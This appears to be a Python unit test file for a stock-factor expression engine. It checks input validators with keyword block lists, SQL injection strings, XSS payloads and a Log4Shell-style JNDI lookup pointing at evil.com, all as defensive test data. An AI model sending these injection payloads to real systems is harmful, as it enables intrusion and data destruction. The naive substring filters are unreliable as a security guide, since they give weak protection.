#!/usr/bin/env python3
"""
独立的单元测试 - 不依赖外部库
测试核心逻辑和安全功能
"""

import unittest
import sys
import os
import re

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestExpressionValidation(unittest.TestCase):
    """独立的表达式验证测试"""

    def test_dangerous_keywords_detection(self):
        """测试危险关键词检测"""
        dangerous_keywords = [
            'import', 'exec', 'eval', '__', 'open', 'file', 'input',
            'raw_input', 'compile', 'globals', 'locals', 'dir', 'vars',
            'getattr', 'setattr', 'delattr', 'hasattr', 'callable',
            'exit', 'quit', 'help', 'copyright', 'credits', 'license'
        ]

        def validate_expression_keywords(expression):
            if not expression or not isinstance(expression, str):
                raise ValueError("表达式不能为空且必须为字符串")

            expression_lower = expression.lower()
            for keyword in dangerous_keywords:
                if keyword in expression_lower:
                    raise ValueError(f"表达式包含不安全的关键词: {keyword}")
            return True

        # 测试安全表达式
        safe_expressions = [
            "MA(CLOSE(), 5)",
            "RSI(CLOSE(), 14)",
            "CLOSE() - REF(CLOSE(), 1)"
        ]

        for expr in safe_expressions:
            self.assertTrue(validate_expression_keywords(expr))

        # 测试危险表达式
        for keyword in dangerous_keywords[:5]:  # 测试前5个关键词
            with self.assertRaises(ValueError):
                validate_expression_keywords(f"MA(CLOSE(), 5) + {keyword}()")

    def test_character_set_validation(self):
        """测试字符集验证"""
        def validate_character_set(expression):
            allowed_pattern = r'^[a-zA-Z0-9_+\-*/().,\s<>=!&|]+$'
            if not re.match(allowed_pattern, expression):
                raise ValueError("表达式包含不允许的字符")
            return True

        # 安全字符
        safe_expressions = [
            "MA(CLOSE(), 5) - MA(CLOSE(), 20)",
            "RSI(CLOSE(), 14) > 70",
            "VOL() / MA(VOL(), 20)",
            "IF(CLOSE() > OPEN(), 1, 0)"
        ]

        for expr in safe_expressions:
            self.assertTrue(validate_character_set(expr))

        # 危险字符
        dangerous_chars = ['$', '#', '@', '%', '^', '&', '\\', '/', '`', '~']
        for char in dangerous_chars[:3]:  # 测试前3个
            with self.assertRaises(ValueError):
                validate_character_set(f"MA(CLOSE(), 5){char}")

    def test_length_validation(self):
        """测试长度验证"""
        def validate_length(expression, max_length=1000):
            if len(expression) > max_length:
                raise ValueError("表达式过长，请保持在1000字符以内")
            return True

        # 正常长度
        normal_expr = "MA(CLOSE(), 5) - MA(CLOSE(), 20)"
        self.assertTrue(validate_length(normal_expr))

        # 过长表达式
        long_expr = "MA(CLOSE(), 5)" * 200  # 超过1000字符
        with self.assertRaises(ValueError):
            validate_length(long_expr)

    def test_dangerous_patterns(self):
        """测试危险模式检测"""
        def validate_patterns(expression):
            dangerous_patterns = ['..', '//', '\\\\', '${', '#{']
            for pattern in dangerous_patterns:
                if pattern in expression:
                    raise ValueError(f"表达式包含不安全的字符模式: {pattern}")
            return True

        # 安全表达式
        safe_expr = "MA(CLOSE(), 5) - MA(CLOSE(), 20)"
        self.assertTrue(validate_patterns(safe_expr))

        # 危险模式
        dangerous_patterns = ['..', '//', '${', '#{']
        for pattern in dangerous_patterns:
            with self.assertRaises(ValueError):
                validate_patterns(f"MA(CLOSE(), 5){pattern}")


class TestDatabaseConfig(unittest.TestCase):
    """数据库配置测试"""

    def test_config_structure(self):
        """测试配置结构"""
        # 模拟DATABASE_CONFIG结构
        mock_config = {
            'host': '192.168.3.46',
            'database': 'factor_factory',
            'user': 'remote',
            'password': 'test_password',
            'port': 3306,
            'charset': 'utf8mb4',
            'autocommit': True,
            'pool_size': 5,
            'pool_name': 'factor_factory_pool'
        }

        # 验证必需的配置项
        required_keys = ['host', 'database', 'user', 'password', 'port']
        for key in required_keys:
            self.assertIn(key, mock_config)

        # 验证数据类型
        self.assertIsInstance(mock_config['port'], int)
        self.assertIsInstance(mock_config['pool_size'], int)
        self.assertIsInstance(mock_config['autocommit'], bool)

    def test_environment_variable_fallback(self):
        """测试环境变量回退机制"""
        import os

        # 模拟环境变量处理逻辑
        def get_config_value(env_key, default_value):
            return os.getenv(env_key, default_value)

        # 测试默认值
        self.assertEqual(get_config_value('NON_EXISTENT_KEY', 'default'), 'default')

        # 测试数值转换
        def get_int_config(env_key, default_value):
            return int(os.getenv(env_key, str(default_value)))

        self.assertEqual(get_int_config('NON_EXISTENT_PORT', 3306), 3306)


class TestUtilityFunctions(unittest.TestCase):
    """工具函数测试"""

    def test_standard_deviation_calculation(self):
        """测试标准差计算"""
        def calculate_std(values):
            if not values:
                return 0
            mean = sum(values) / len(values)
            variance = sum((x - mean) ** 2 for x in values) / len(values)
            return variance ** 0.5

        # 测试正常情况
        values = [1, 2, 3, 4, 5]
        std = calculate_std(values)
        expected_std = (sum((x - 3) ** 2 for x in values) / len(values)) ** 0.5
        self.assertAlmostEqual(std, expected_std, places=6)

        # 测试空列表
        self.assertEqual(calculate_std([]), 0)

        # 测试单个值
        self.assertEqual(calculate_std([5]), 0)

    def test_safe_format_result(self):
        """测试安全的结果格式化"""
        def format_factor_result(row):
            if len(row) < 7:
                raise ValueError("数据行格式不正确")

            return {
                'id': row[0],
                'name': row[1],
                'expression': row[2],
                'category': row[3],
                'created_date': row[4],
                'status': row[5],
                'description': row[6]
            }

        # 测试正常数据
        test_row = (1, "test_factor", "MA(CLOSE(), 5)", "technical",
                   "2024-01-01", "active", "测试因子")
        result = format_factor_result(test_row)

        self.assertEqual(result['id'], 1)
        self.assertEqual(result['name'], "test_factor")
        self.assertEqual(result['status'], "active")

        # 测试异常数据
        with self.assertRaises(ValueError):
            format_factor_result((1, 2, 3))  # 数据不足


class TestSecurityPatterns(unittest.TestCase):
    """安全模式专项测试"""

    def test_sql_injection_patterns(self):
        """测试SQL注入防护"""
        def is_safe_expression(expr):
            # 简化的SQL注入检测
            sql_patterns = [
                "';", "'", '"', "--", "/*", "*/", "union", "select",
                "drop", "delete", "insert", "update", "alter"
            ]
            expr_lower = expr.lower()
            return not any(pattern in expr_lower for pattern in sql_patterns)

        # 安全表达式
        safe_expressions = [
            "MA(CLOSE(), 5)",
            "RSI(CLOSE(), 14) > 70",
            "VOL() / MA(VOL(), 20)"
        ]

        for expr in safe_expressions:
            self.assertTrue(is_safe_expression(expr))

        # SQL注入尝试
        sql_injections = [
            "'; DROP TABLE factors; --",
            "' OR '1'='1",
            "UNION SELECT * FROM factors"
        ]

        for injection in sql_injections:
            self.assertFalse(is_safe_expression(injection))

    def test_script_injection_patterns(self):
        """测试脚本注入防护"""
        def is_safe_from_scripts(expr):
            script_patterns = [
                "<script", "javascript:", "${", "#{", "<%", "%>"
            ]
            expr_lower = expr.lower()
            return not any(pattern in expr_lower for pattern in script_patterns)

        # 安全表达式
        safe_expr = "MA(CLOSE(), 5) - MA(CLOSE(), 20)"
        self.assertTrue(is_safe_from_scripts(safe_expr))

        # 脚本注入尝试
        script_injections = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com}"
        ]

        for injection in script_injections:
            self.assertFalse(is_safe_from_scripts(injection))


if __name__ == '__main__':
    print("运行独立单元测试（不依赖外部库）")
    print("="*50)

    # 设置日志级别避免测试时的日志干扰
    import logging
    logging.getLogger().setLevel(logging.CRITICAL)

    # 运行测试
    unittest.main(verbosity=2, exit=False)

    print("\n" + "="*50)
    print("独立测试完成！")
    print("注意：完整测试需要安装hikyuu和mysql-connector-python")